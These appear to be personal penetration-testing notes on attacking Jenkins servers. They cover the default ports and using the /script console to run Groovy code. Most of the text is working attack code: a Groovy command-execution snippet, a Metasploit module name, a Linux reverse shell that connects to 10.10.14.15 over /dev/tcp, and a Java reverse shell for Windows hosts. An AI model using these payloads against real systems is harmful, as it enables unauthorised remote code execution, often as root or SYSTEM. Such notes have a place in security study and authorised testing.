Jenkins usually sit on Tomcat Port 8080, Port 5000 is for slave server, discovery usually comes from manual evaluation or nmap

Attacking Jenkins:

After gaining access to Jenkins, the quickest way to archive RCE is by using the script console, which is located at /script, it accept arbitrary Groovy scripts and can be abused to run OS commands.

The following scripts allow us to run a system command:
```
def cmd = 'id' #Change id to command we want
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

To gain a reverse shell (which is very lucrative as Jenkins usually sits on the context of root or SYSTEM, although their are exceptions), we can use the following metasploit module:
```
exploit/multi/http/jenkins_script_console 
```
Or script:
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

Against a window host, we can use the following to get ourself a reverse shell, modify localhost to our ip and change port if needed:
```
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```